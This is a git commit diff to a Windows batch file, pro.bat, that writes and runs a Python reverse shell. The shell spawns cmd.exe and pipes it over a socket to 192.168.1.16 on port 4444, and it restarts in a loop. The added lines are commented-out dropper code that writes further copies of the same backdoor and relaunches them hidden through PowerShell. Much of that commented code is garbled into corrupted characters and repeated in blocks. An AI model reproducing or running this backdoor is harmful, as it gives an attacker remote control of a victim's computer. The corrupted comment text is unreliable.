fddf2a6a4e13750e2a5db568664802ed32aa0834
0x2034 <168307322+0x2034@users.noreply.github.com>
2024-05-07 05:38:30 +0300

    Update pro.bat

--- pro.bat
+++ pro.bat
@@ -1,3 +1,16 @@
+@REM start.bat --> in q« ­èêÚ¶)à ([µÛ]£.bat
+@REM @yÈh off
+@REM cd %µé©%
+@REM yÈh @yÈh off > ([µÛ]£.bat
+@REM yÈh cd %µé©% >> ([µÛ]£.bat
+@REM yÈh :) >> ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh :)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh1.py" ^^^(^ ^>^> ¦º5.bat^ >>([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^>^> ¦º5.bat^  >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
 @echo off
 del %temp%\rev.bat
 del %temp%\vb.bat
@@ -5,7 +18,50 @@ del %temp%\vb.bat
 set FILE=%temp%\sh.py
 if not exist %FILE% (
     (
-        echo import socket
+@REM yÈh yÈh            yÈh jh® threading^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    {¦ 
+@REM çyËb¢t^~ëtJë¢ as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        ­ën® ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh.^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not ¢ëiº^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                s.±éÝjY^^^^(¢ëiº^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error ±éÝx ¢ëiº:", e^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def r_i^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                u«Z = s.­ç/^^^^(×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not u«Z^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.write^^^^(u«Z^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.flush^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error receiving input:", e^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=s_o, daemon=N»^^^^).start^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=r_i, daemon=N»^^^^).start^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    ¶).sleep^^^^(30^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+ echo import socket
         echo import os
         echo import threading
         echo import subprocess as sp
@@ -17,7 +73,67 @@ if not exist %FILE% (
         echo.
         echo    try:
         echo        s.connect^(^('192.168.1.16', 4444^)^)
-        echo    except ConnectionRefusedError as e:
+@REM yÈh yÈh            yÈh while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    rev^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    print^^^^(".x ..."^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh        ) ^^^> %%µé©%%\sh1.py^^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) z[ ^( ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    §+a¢} %%µé©%%\sh1.py ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ¶)¢ë ^^/t 60 ^^^>^nul ^>^>^ ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    h ) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh ¦®È^ -c "Start->ºzË -)^=«a "%%µé©%%\¦º5.bat" -Z)Ý£­ÊW ']z" >> ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh :)^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh.py" ^^^(^ ^>^> pro.bat^ >>([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^>^> pro.bat^  >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    try^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    {¦ 
+@REM çyËb¢t^~ëtJë¢ as e^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        ­ën® ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh.^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not ¢ëiº^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                s.±éÝjY^^^^(¢ëiº^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error ±éÝx ¢ëiº:", e^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def r_i^^^^(^^^^): ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                u«Z = s.­ç/^^^^(×M¸^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not u«Z^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.write^^^^(u«Z^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.flush^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error receiving input:", e^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=s_o, daemon=N»^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=r_i, daemon=N»^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    ¶).sleep^^^^(30^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+  echo    except ConnectionRefusedError as e:
         echo        print^('refused ... Check if listener is running.'^)
         echo        return
         echo.
@@ -58,4 +174,122 @@ if not exist %FILE% (
    timeout /t 60 >nul
 )
 goto loop
+@REM yÈh yÈh            yÈh while N»^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    rev^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    print^^^^(".x ..."^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh        ) ^^^> %%µé©%%\sh.py^^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) z[ ^( ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    §+a¢} %%µé©%%\sh.py ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ¶)¢ë ^^/t 60 ^^^>^nul ^>^>^ pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    h ) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh ¦®È^ -c "Start->ºzË -)^=«a "%%µé©%%\pro.bat" -Z)Ý£­ÊW ']z" >> ([µÛ]£.bat
+@REM yÈh ¶)¢ë ^/t 900 ^þz­æ¤ ^>nul >> ([µÛ]£.bat
+@REM yÈh h )  >> ([µÛ]£.bat
+@REM ¦®È^ -c "Start->ºzË -)^=«a "%µé©%\([µÛ]£.bat" -Z)Ý£­ÊW ']z"
+@REM yÈh yÈh            yÈh                    break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                s.±éÝjY^^^^(¢ëiº^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error ±éÝx ¢ëiº:", e^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def r_i^^^^(^^^^): ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                u«Z = s.­ç/^^^^(×M¸^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not u«Z^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.write^^^^(u«Z^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.flush^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error receiving input:", e^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=s_o, daemon=N»^^^^).start^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=r_i, daemon=N»^^^^).start^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    ¶).sleep^^^^(30^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh while N»^^^^: ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    rev^^^^(^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    print^^^^(".x ..."^^^^) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh        ) ^^^> %%µé©%%\sh1.py^^ ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) z[ ^( ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    §+a¢} %%µé©%%\sh1.py ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ¶)¢ë ^^/t 60 ^^^>^nul ^>^>^ ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    h ) ^>^> ¦º5.bat^ >> ([µÛ]£.bat
+@REM yÈh ¦®È^ -c "Start->ºzË -)^=«a "%%µé©%%\¦º5.bat" -Z)Ý£­ÊW ']z" >> ([µÛ]£.bat
+@REM yÈh yÈh @yÈh off ^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh del vb1.bat^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh :)^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh if not exist "%%µé©%%\sh.py" ^^^(^ ^>^> pro.bat^ >>([µÛ]£.bat
+@REM yÈh yÈh     ^^(^ ^>^> pro.bat^  >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²$z^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® os^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® threading^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ²æé®² as sp^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh jh® ¶)^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh def rev^^^^(^^^^): ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    p = sp.Popen^^^^(['cmd.exe'], stdin=sp.<Ä, stdout=sp.<Ä, stderr=sp.I0ÎQ^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    s = ²$z.²$z^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    try^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        s.rçyË^^^^(^^^^('192.168.1.16', ã8^^^^)^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    {¦ 
+@REM çyËb¢t^~ëtJë¢ as e^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        print^^^^('­çî±ç ... Check if +-zw« is ®éçx.'^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        ­ën® ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh.^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def s_o^^^^(^^^^): ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                ¢ëiº = os.­æ^^^^(p.²×hº.~)^^^^^(^^^^), ×M¸^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not ¢ëiº^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                s.±éÝjY^^^^(¢ëiº^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error ±éÝx ¢ëiº:", e^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    def r_i^^^^(^^^^): ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh        while N»^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            try^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                u«Z = s.­ç/^^^^(×M¸^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                if not u«Z^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                    break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.write^^^^(u«Z^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                p.stdin.flush^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh            {¦ Exception as e^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                print^^^^("Error receiving input:", e^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh                break ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=s_o, daemon=N»^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    threading.NÞi^^^^(target=r_i, daemon=N»^^^^).start^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    ¶).sleep^^^^(30^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh. ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh while N»^^^^: ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    rev^^^^(^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh            yÈh    print^^^^(".x ..."^^^^) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh        ) ^^^> %%µé©%%\sh.py^^ ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) z[ ^( ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    §+a¢} %%µé©%%\sh.py ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ¶)¢ë ^^/t 60 ^^^>^nul ^>^>^ pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    ) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh yÈh    h ) ^>^> pro.bat^ >> ([µÛ]£.bat
+@REM yÈh ¦®È^ -c "Start->ºzË -)^=«a "%%µé©%%\pro.bat" -Z)Ý£­ÊW ']z" >> ([µÛ]£.bat
+@REM yÈh ¶)¢ë ^/t 900 ^þz­æ¤ ^>nul >> ([µÛ]£.bat
+@REM yÈh h )  >> ([µÛ]£.bat
+@REM ¦®È^ -c "Start->ºzË -)^=«a "%µé©%\([µÛ]£.bat" -Z)Ý£­ÊW ']z"
 
+
+
+
+
+
+
+
+       
+      
